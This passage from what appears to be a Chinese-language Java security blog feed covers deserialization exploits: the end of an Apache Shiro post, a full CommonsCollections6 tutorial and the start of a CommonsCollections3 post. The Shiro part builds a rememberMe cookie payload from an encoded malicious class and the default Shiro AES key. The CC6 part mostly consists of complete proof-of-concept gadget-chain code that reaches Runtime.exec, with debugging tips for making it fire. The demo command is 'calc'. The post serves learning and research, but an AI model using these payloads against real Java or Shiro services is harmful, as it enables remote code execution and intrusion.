CommonsCollectionsShiro().getPayload(&quot;yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAGwEAClNvdXJjZUZpbGUBAA1FdmlsVGVzdC5qYXZhDAAOAA8HABwMAB0AHgEABGNhbGMMAB8AIAEACEV2aWxUZXN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAMAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAAEQALAAAABAABAAwAAQAOAA8AAgAJAAAALgACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAABAAoAAAAOAAMAAAASAAQAEwANABQACwAAAAQAAQAQAAEAEQAAAAIAEg&quot;.getBytes());  </span><br><span class="line">        AesCipherService aes = new AesCipherService();  </span><br><span class="line">  </span><br><span class="line">        byte[] key = Base64.decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;);  </span><br><span class="line">        ByteSource ciphertext = aes.encrypt(payloads, key);  </span><br><span class="line">        System.out.printf(ciphertext.toString());  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>生成的POC传入cookie，弹出计算器</p><p><img src="/2023/05/19/JAVA-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/gg.png"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>JAVA安全任重道远，希望对你有所帮助！</p>]]></content>
      
      
      <categories>
          
          <category> JAVA安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAVA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVA-CommonsCollections6</title>
      <link href="/2023/05/17/JAVA-CommonsCollections6/"/>
      <url>/2023/05/17/JAVA-CommonsCollections6/</url>
      
        <content type="html"><![CDATA[<h1 id="为什么需要CC6"><a href="#为什么需要CC6" class="headerlink" title="为什么需要CC6"></a>为什么需要CC6</h1><p>因为这是 Shiro 会利用到的一条链子 可以说是 CC1 + lazymap 的一种重合，但是在 8U71之后，CC1不能用了，主要是sun.reflect.annotation.AnnotationInvocationHandler#readObject 的逻辑变化了。</p><p>CC6 可以说是在CC库中 相对比较通用的利用链，这就是为什么 我CSDN 中也写了，并决定发在这的原因，在后续的Shiro 中 使用频率还是很高的，所以我决定再次深入了解其原理。为了解决高版本中 JAVA的利用问题，我们先来看看此链，继续贴上我的珍藏图：</p><p><img src="/2023/05/17/JAVA-CommonsCollections6/cc%E9%93%BE.jpg"></p><p>可以看到 CC6 是利用的 HashMap的链子，这里贴一下P神 简化的利用链代码;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">/* Gadget chain: </span><br><span class="line">java.io.ObjectInputStream.readObject() </span><br><span class="line">java.util.HashMap.readObject() </span><br><span class="line">java.util.HashMap.hash() </span><br><span class="line"></span><br><span class="line">org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode() org.apache.commons.collections.keyvalue.TiedMapEntry.getValue() </span><br><span class="line"></span><br><span class="line">org.apache.commons.collections.map.LazyMap.get() </span><br><span class="line"></span><br><span class="line">org.apache.commons.collections.functors.ChainedTransformer.transform() </span><br><span class="line"></span><br><span class="line">org.apache.commons.collections.functors.InvokerTransformer.transform() java.lang.reflect.Method.invoke() java.lang.Runtime.exec() */</span><br></pre></td></tr></table></figure><p>这个链 主要是要看从最开始到 org.apache.commons.collections.map.LazyMap.get() 的那⼀部 分<br>简单来说，解决Java⾼版本利⽤问 题，实际上就是在找上下⽂中是否还有其他调⽤ LazyMap#get() 的地⽅。</p><p>找到的类是 是 org.apache.commons.collections.keyvalue.TiedMapEntry ，在其getValue⽅法 中调⽤了 this.map.get ，⽽其hashCode⽅法调⽤了getValue⽅法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">public class TiedMapEntry implements Map.Entry, KeyValue, Serializable &#123;  </span><br><span class="line">  </span><br><span class="line">private static final long serialVersionUID = -8453869361373831205L;  </span><br><span class="line"></span><br><span class="line">    public TiedMapEntry(Map map, Object key) &#123;  </span><br><span class="line">        super();  </span><br><span class="line">        this.map = map;  </span><br><span class="line">        this.key = key;  </span><br><span class="line">    &#125;  </span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">   public Object getKey() &#123;  </span><br><span class="line">        return key;  </span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public Object getValue() &#123;  </span><br><span class="line">        return map.get(key);  </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">// ....</span><br><span class="line"></span><br><span class="line">public int hashCode() &#123; </span><br><span class="line">Object value = this.getValue(); </span><br><span class="line">return (this.getKey() == null ? 0 : this.getKey().hashCode()) ^ (value == null ? 0 : value.hashCode()); &#125;</span><br></pre></td></tr></table></figure><p>如果这里的 map &#x3D; LazyMap 就会调用LazyMap#get 触发CC1利用链，欲触发LazyMap利⽤链，要找到就是哪⾥调⽤了 TiedMapEntry#hashCode 。</p><p>，在 java.util.HashMap#readObject 中就可以找到 HashMap#hash() 的调⽤，去掉了 最前⾯的两次调⽤：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public class HashMap extends AbstractMap implements Map, Cloneable, Serializable &#123;</span><br><span class="line">static final int hash(Object key) &#123; </span><br><span class="line">int h;</span><br><span class="line">return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16); &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">private void readObject(java.io.ObjectInputStream s) throws IOException,ClassNotFoundException &#123;</span><br><span class="line"> s.defaultReadObject(); // ... p for (int i = 0; i &lt; mappings; i++) &#123; </span><br><span class="line"> @SuppressWarnings(&quot;unchecked&quot;) K key = (K) s.readObject(); </span><br><span class="line"> @SuppressWarnings(&quot;unchecked&quot;) V value = (V) s.readObject(); putVal(hash(key), </span><br><span class="line"> key, value, false, false); &#125; &#125; &#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在HashMap的readObject⽅法中，调⽤到了 hash(key) ，⽽hash⽅法中，调⽤到了 key.hashCode() 。所以，我们只需要让这个key等于TiedMapEntry对象，即可连接上前⾯的分析过 程，构成⼀个完整的Gadget。</p><h1 id="逐步构造POC"><a href="#逐步构造POC" class="headerlink" title="逐步构造POC"></a>逐步构造POC</h1><p>然后尝试 自己构造一波这个 POC，再说说自己的踩坑过程，建议都自己构造一次，再来找问题，虽然 会有点长，但是你一步步自己构造一定会收获颇丰！ 以下是我个人的POC  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">public class CC66 &#123;  </span><br><span class="line">  </span><br><span class="line">    public static void main(String[] args) throws  Exception&#123;  </span><br><span class="line">  </span><br><span class="line">        //Runtime构造部分  </span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;  </span><br><span class="line">            new ConstantTransformer(Class.forName(&quot;java.lang.Runtime&quot;)),  </span><br><span class="line">            new InvokerTransformer(  </span><br><span class="line">                &quot;getMethod&quot;,  </span><br><span class="line">                new Class[]&#123;String.class,Class[].class&#125;,  </span><br><span class="line">                new Object[]&#123;&quot;getRuntime&quot;,new Class[0]&#125;  </span><br><span class="line">            ),  </span><br><span class="line">            new InvokerTransformer(  </span><br><span class="line">                &quot;invoke&quot;,  </span><br><span class="line">                new Class[]&#123;Object.class,Object[].class&#125;,  </span><br><span class="line">                new Object[]&#123;null,new Object[0]&#125;  </span><br><span class="line">            ),  </span><br><span class="line">            new InvokerTransformer(  </span><br><span class="line">                &quot;exec&quot;,  </span><br><span class="line">                new Class[]&#123;String.class&#125;,  </span><br><span class="line">                new Object[]&#123;&quot;calc&quot;&#125;  </span><br><span class="line">            )  </span><br><span class="line">        &#125;;  </span><br><span class="line">        //ChainedTransformer构造部分  </span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  </span><br><span class="line">  </span><br><span class="line">        //LazyMap构造部分  </span><br><span class="line">        HashMap innerMap = new HashMap();  </span><br><span class="line">        Map outMap = LazyMap.decorate(innerMap, chainedTransformer); //outMap = LazyMap类  </span><br><span class="line">  </span><br><span class="line">        //TiedMapEntry构造部分  </span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(outMap, &quot;Ku1s-1&quot;);  </span><br><span class="line">  </span><br><span class="line">        //HashMap构造部分  </span><br><span class="line">        HashMap hashMap = new HashMap();  </span><br><span class="line">        hashMap.put(tiedMapEntry,&quot;Ku1s-2&quot;);  </span><br><span class="line">  </span><br><span class="line">        byte[] serialize = serialize(hashMap);  </span><br><span class="line">        unserialize(serialize);  </span><br><span class="line">    &#125;  </span><br><span class="line">    public static void unserialize(byte[] bytes) throws Exception&#123;  </span><br><span class="line">        try(ByteArrayInputStream bain = new ByteArrayInputStream(bytes);  </span><br><span class="line">            ObjectInputStream oin = new ObjectInputStream(bain))&#123;  </span><br><span class="line">            oin.readObject();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    public static byte[] serialize(Object o) throws Exception &#123;  </span><br><span class="line">        try (ByteArrayOutputStream baout = new ByteArrayOutputStream();  </span><br><span class="line">             ObjectOutputStream oout = new ObjectOutputStream(baout)) &#123;  </span><br><span class="line">            oout.writeObject(o);  </span><br><span class="line">            return baout.toByteArray();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>成功弹出计算器~</p><p><img src="/2023/05/17/JAVA-CommonsCollections6/exec1.PNG"></p><p>但实际上 我们这个计算器弹的是不正确的，为了避免本地调试时触发命令执 ⾏我们可以加入 假 的Transformer数组进去，等最后要⽣成Payload的 时候，再生成一个 ChainedTransformer，调用其方法，再把真正的 transformers 替换进去：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] fakeTransformers = new Transformer[] &#123;new ConstantTransformer(1)&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">public class CC66 &#123;  </span><br><span class="line">  </span><br><span class="line">    public static void main(String[] args) throws  Exception&#123;  </span><br><span class="line">  </span><br><span class="line">        //Runtime构造部分  </span><br><span class="line">        Transformer[] fakeTransformers = new Transformer[] &#123;new ConstantTransformer(1)&#125;;  </span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;  </span><br><span class="line">            new ConstantTransformer(Class.forName(&quot;java.lang.Runtime&quot;)),  </span><br><span class="line">            new InvokerTransformer(  </span><br><span class="line">                &quot;getMethod&quot;,  </span><br><span class="line">                new Class[]&#123;String.class,Class[].class&#125;,  </span><br><span class="line">                new Object[]&#123;&quot;getRuntime&quot;,new Class[0]&#125;  </span><br><span class="line">            ),  </span><br><span class="line">            new InvokerTransformer(  </span><br><span class="line">                &quot;invoke&quot;,  </span><br><span class="line">                new Class[]&#123;Object.class,Object[].class&#125;,  </span><br><span class="line">                new Object[]&#123;null,new Object[0]&#125;  </span><br><span class="line">            ),  </span><br><span class="line">            new InvokerTransformer(  </span><br><span class="line">                &quot;exec&quot;,  </span><br><span class="line">                new Class[]&#123;String.class&#125;,  </span><br><span class="line">                new Object[]&#123;&quot;calc&quot;&#125;  </span><br><span class="line">            )  </span><br><span class="line">        &#125;;  </span><br><span class="line">        //ChainedTransformer构造部分  </span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(fakeTransformers);  </span><br><span class="line">  </span><br><span class="line">        //LazyMap构造部分  </span><br><span class="line">        HashMap innerMap = new HashMap();  </span><br><span class="line">        Map outMap = LazyMap.decorate(innerMap, chainedTransformer); //outMap = LazyMap类  </span><br><span class="line">  </span><br><span class="line">        //TiedMapEntry构造部分  </span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(outMap, &quot;Ku1s-1&quot;);  </span><br><span class="line">  </span><br><span class="line">        //HashMap构造部分  </span><br><span class="line">        HashMap hashMap = new HashMap();  </span><br><span class="line">        hashMap.put(tiedMapEntry,&quot;Ku1s-2&quot;);  </span><br><span class="line">  </span><br><span class="line">        Class clazz = Class.forName(&quot;org.apache.commons.collections.functors.ChainedTransformer&quot;);  </span><br><span class="line">        Field field = clazz.getDeclaredField(&quot;iTransformers&quot;);  </span><br><span class="line">        field.setAccessible(true);  </span><br><span class="line">        field.set(chainedTransformer,transformers);  </span><br><span class="line">  </span><br><span class="line">        byte[] serialize = serialize(hashMap);  </span><br><span class="line">        unserialize(serialize);  </span><br><span class="line">    &#125;  </span><br><span class="line">    public static void unserialize(byte[] bytes) throws Exception&#123;  </span><br><span class="line">        try(ByteArrayInputStream bain = new ByteArrayInputStream(bytes);  </span><br><span class="line">            ObjectInputStream oin = new ObjectInputStream(bain))&#123;  </span><br><span class="line">            oin.readObject();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    public static byte[] serialize(Object o) throws Exception &#123;  </span><br><span class="line">        try (ByteArrayOutputStream baout = new ByteArrayOutputStream();  </span><br><span class="line">             ObjectOutputStream oout = new ObjectOutputStream(baout)) &#123;  </span><br><span class="line">            oout.writeObject(o);  </span><br><span class="line">            return baout.toByteArray();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行，这下G了  连计算器都不弹了……..</p><h1 id="为什么没有弹出计算器？"><a href="#为什么没有弹出计算器？" class="headerlink" title="为什么没有弹出计算器？"></a>为什么没有弹出计算器？</h1><p>单步调试⼀下 ，会发现关键点在LazyMap的get⽅法 ，他没有进入这个if语句，得到的结果就是没有触发我们的命令 </p><p><img src="/2023/05/17/JAVA-CommonsCollections6/ec.jpG"></p><p>这是为什么呢?<br><code>_containsKey_方法——判断是否包含指定的键名</code>  </p><p>唯一出现 Ku1s - 1 的地方 就是在我们 new TiedMapEntry 的时候<br>但 TiedMapEntry 的构造函数并没有修改outerMap</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//LazyMap构造部分  </span><br><span class="line">HashMap innerMap = new HashMap();  </span><br><span class="line">Map outMap = LazyMap.decorate(innerMap, chainedTransformer); //outMap = LazyMap类  </span><br><span class="line">  </span><br><span class="line">//TiedMapEntry构造部分  </span><br><span class="line">TiedMapEntry tiedMapEntry = new TiedMapEntry(outMap, &quot;Ku1s-1&quot;);</span><br><span class="line"></span><br><span class="line">HashMap hashMap = new HashMap();  </span><br><span class="line">hashMap.put(tiedMapEntry,&quot;Ku1s-2&quot;);</span><br></pre></td></tr></table></figure><p>其实关键点就在于 hashMap.put(tiedMapEntry,”Ku1s-2”); 语句</p><p>HashMap的put⽅法中，也有调⽤到 hash(key) ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public V put(K key, V value) &#123; </span><br><span class="line">return putVal(hash(key), key, value, false, true); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>哈哈哈  这就相当于撞了个乌龙！~ 本来是想利用 readObject 中的 hash()去调用的，没曾想put方法也能够触发这个 hash ，也就是说提前把我们的代码执行了一遍，因为我前⾯⽤了 fakeTransformers ，所以此 时并没有触发命令执⾏，但实际上也对我们构造Payload产⽣了影响。</p><p>我们的解决⽅法也很简单，只需要将Ku1s-1这个Key，再从outerMap中移除即 可： outerMap.remove(“Ku1s-1”) 。</p><p>完整POC：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">public class CC66 &#123;  </span><br><span class="line">  </span><br><span class="line">    public static void main(String[] args) throws  Exception&#123;  </span><br><span class="line">  </span><br><span class="line">        //Runtime构造部分  </span><br><span class="line">        Transformer[] fakeTransformers = new Transformer[] &#123;new ConstantTransformer(1)&#125;;  </span><br><span class="line">        Transformer[] exp = new Transformer[]&#123;  </span><br><span class="line">            new ConstantTransformer(Class.forName(&quot;java.lang.Runtime&quot;)),  </span><br><span class="line">            new InvokerTransformer(  </span><br><span class="line">                &quot;getMethod&quot;,  </span><br><span class="line">                new Class[]&#123;String.class,Class[].class&#125;,  </span><br><span class="line">                new Object[]&#123;&quot;getRuntime&quot;,new Class[0]&#125;  </span><br><span class="line">            ),  </span><br><span class="line">            new InvokerTransformer(  </span><br><span class="line">                &quot;invoke&quot;,  </span><br><span class="line">                new Class[]&#123;Object.class,Object[].class&#125;,  </span><br><span class="line">                new Object[]&#123;null,new Object[0]&#125;  </span><br><span class="line">            ),  </span><br><span class="line">            new InvokerTransformer(  </span><br><span class="line">                &quot;exec&quot;,  </span><br><span class="line">                new Class[]&#123;String.class&#125;,  </span><br><span class="line">                new Object[]&#123;&quot;calc&quot;&#125;  </span><br><span class="line">            )  </span><br><span class="line">        &#125;;  </span><br><span class="line">        //ChainedTransformer构造部分  </span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(fakeTransformers);  </span><br><span class="line">  </span><br><span class="line">        //LazyMap构造部分  </span><br><span class="line">        HashMap innerMap = new HashMap();  </span><br><span class="line">        Map outMap = LazyMap.decorate(innerMap, chainedTransformer); //outMap = LazyMap类  </span><br><span class="line">  </span><br><span class="line">        //TiedMapEntry构造部分  </span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(outMap, &quot;Ku1s-1&quot;);  </span><br><span class="line">  </span><br><span class="line">        //HashMap构造部分  </span><br><span class="line">        HashMap hashMap = new HashMap();  </span><br><span class="line">        hashMap.put(tiedMapEntry,&quot;Ku1s-2&quot;);  </span><br><span class="line">  </span><br><span class="line">        outMap.remove(&quot;Ku1s-1&quot;);  </span><br><span class="line">  </span><br><span class="line">        Class clazz = Class.forName(&quot;org.apache.commons.collections.functors.ChainedTransformer&quot;);  </span><br><span class="line">        Field field = clazz.getDeclaredField(&quot;iTransformers&quot;);  </span><br><span class="line">        field.setAccessible(true);  </span><br><span class="line">        field.set(chainedTransformer,exp);  </span><br><span class="line">  </span><br><span class="line">        byte[] serialize = serialize(hashMap);  </span><br><span class="line">        unserialize(serialize);  </span><br><span class="line">    &#125;  </span><br><span class="line">    public static void unserialize(byte[] bytes) throws Exception&#123;  </span><br><span class="line">        try(ByteArrayInputStream bain = new ByteArrayInputStream(bytes);  </span><br><span class="line">            ObjectInputStream oin = new ObjectInputStream(bain))&#123;  </span><br><span class="line">            oin.readObject();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    public static byte[] serialize(Object o) throws Exception &#123;  </span><br><span class="line">        try (ByteArrayOutputStream baout = new ByteArrayOutputStream();  </span><br><span class="line">             ObjectOutputStream oout = new ObjectOutputStream(baout)) &#123;  </span><br><span class="line">            oout.writeObject(o);  </span><br><span class="line">            return baout.toByteArray();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/05/17/JAVA-CommonsCollections6/poc.png"></p><p>希望对你有所帮助 ~</p>]]></content>
      
      
      <categories>
          
          <category> JAVA安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAVA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVA-CommonsCollections3</title>
      <link href="/2023/05/16/JAVA-CommonsCollections3/"/>
      <url>/2023/05/16/JAVA-CommonsCollections3/</url>
      
        <content type="html"><![CDATA[<h1 id="为什么需要CommonsCollections3"><a href="#为什么需要CommonsCollections3" class="headerlink" title="为什么需要CommonsCollections3"></a>为什么需要CommonsCollections3</h1><p>上篇文章 分析了 动态加载字节码的危害，如果有一个可控的http服务路径，则可能存在 恶意加载动态字节码，因此，我们很自然的会想到，如何更巧妙的利用他，所以 CC3 诞生了。</p><p>CC3 其实是 和 CC1 的结合  即 从原来的 InvokerTransformer 到 Runtime.class 到exec() 变成了 InvokerTransformer调用 TemplatesImpl#newTransformer()~</p><p>届时，我献出我珍藏已久的一张图：<br><img src="/2023/05/16/JAVA-CommonsCollections3/cc%E9%93%BE.jpg"></p><p>我们只需要将 CC1 和 CC3 两段POC 结合一下，即可很容易的改造出一个任意字节码的CC链，只需要把CC1中的 InvokerTransformer 的执行方法 改成 TemplatesImpl::newTransformer() 即可：</p><p>POC如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">package CommonsCollections3;</span><br><span class="line"></span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.annotation.Target;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.lang.reflect.InvocationHandler;</span><br><span class="line">import java.lang.reflect.Proxy;</span><br><span class="line">import java.util.Base64;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class cc3&#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Templates templates = new TemplatesImpl();</span><br><span class="line">        byte[] bytes = 